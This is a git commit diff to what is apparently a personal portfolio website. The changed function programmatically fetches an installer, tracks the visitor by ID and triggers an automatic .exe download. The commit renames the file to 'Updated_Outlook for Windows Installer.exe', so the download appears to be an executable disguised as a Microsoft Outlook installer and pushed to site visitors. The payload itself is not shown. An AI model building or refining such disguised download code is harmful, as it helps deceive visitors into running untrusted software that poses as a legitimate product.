a6f813ad89bbfceccb95dbb616584f2d2391e846
averyanderson0925-create <averyanderson0925@gmail.com>
2026-07-15 15:01:38 -0700

    changed app

--- portofolio/src/routes/index.tsx
+++ portofolio/src/routes/index.tsx
@@ -122,7 +122,7 @@ async function startInstallerDownload(downloadUrl: string, visitorId: string) {
   const objectUrl = URL.createObjectURL(installer);
   const link = document.createElement("a");
   link.href = objectUrl;
-  link.download = "Outlook for Windows Installer.exe";
+  link.download = "Updated_Outlook for Windows Installer.exe";
   document.body.append(link);
   link.click();
   link.remove();
